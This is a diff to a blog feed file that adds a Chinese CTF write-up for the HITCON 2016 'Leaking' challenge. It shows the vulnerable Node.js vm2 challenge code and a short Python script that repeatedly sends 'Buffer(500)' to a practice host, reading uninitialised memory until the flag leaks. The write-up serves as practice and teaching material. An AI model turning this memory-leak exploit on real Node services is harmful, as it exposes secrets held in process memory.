@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>刷题笔记:[HITCON 2016]Leaking</title>
+      <link href="/p/325534609.html"/>
+      <url>/p/325534609.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[nodejs|沙箱逃逸]</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">&quot;use strict&quot;;var randomstring &#x3D; require(&quot;randomstring&quot;);var express &#x3D; require(&quot;express&quot;);var &#123;    VM&#125; &#x3D; require(&quot;vm2&quot;);var fs &#x3D; require(&quot;fs&quot;);var app &#x3D; express();var flag &#x3D; require(&quot;.&#x2F;config.js&quot;).flagapp.get(&quot;&#x2F;&quot;, function(req, res) &#123;    res.header(&quot;Content-Type&quot;, &quot;text&#x2F;plain&quot;);    &#x2F;*    Orange is so kind so he put the flag here. But if you can guess correctly :P    *&#x2F;    eval(&quot;var flag_&quot; + randomstring.generate(64) + &quot; &#x3D; \&quot;hitcon&#123;&quot; + flag + &quot;&#125;\&quot;;&quot;)    if (req.query.data &amp;&amp; req.query.data.length &lt;&#x3D; 12) &#123;        var vm &#x3D; new VM(&#123;            timeout: 1000        &#125;);        console.log(req.query.data);        res.send(&quot;eval -&gt;&quot; + vm.run(req.query.data));    &#125; else &#123;        res.send(fs.readFileSync(__filename).toString());    &#125;&#125;);app.listen(3000, function() &#123;    console.log(&quot;listening on port 3000!&quot;);&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><blockquote><p>The <code>vm</code> module enables compiling and running code within V8 Virtual Machine contexts. <strong>The <code>vm</code> module is not a security mechanism. Do not use it to run untrusted code.</strong></p></blockquote><p>是在vm虚拟机中</p><blockquote><p>在较早一点的node版本中(8.0 之前)，当Buffer的构造函数传入数字时,会得到与数字长度一致的一个Buffer，并且这个Buffer是未清零的。8.0之后的版本可以通过另一个函数Buffer.allocUnsafe(size)来获得未清空的内存。</p></blockquote><p>这题&lt;8.0</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'http://aec15194-fd75-4137-b7ca-09b92683d609.node4.buuoj.cn:81/?data=Buffer(500)'</span>response <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> <span class="token string">'flag'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'flag&#123;'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大概意思就是不断传<code>Buffer(500)</code>进去，就有可能把沙箱内的数据带出来。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> Web </tag>
+            
+            <tag> nodejs </tag>
+            
+            <tag> 沙箱逃逸 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>刷题笔记:[XDCTF 2015]filemanager</title>
       <link href="/p/2656617040.html"/>
       <url>/p/2656617040.html</url>
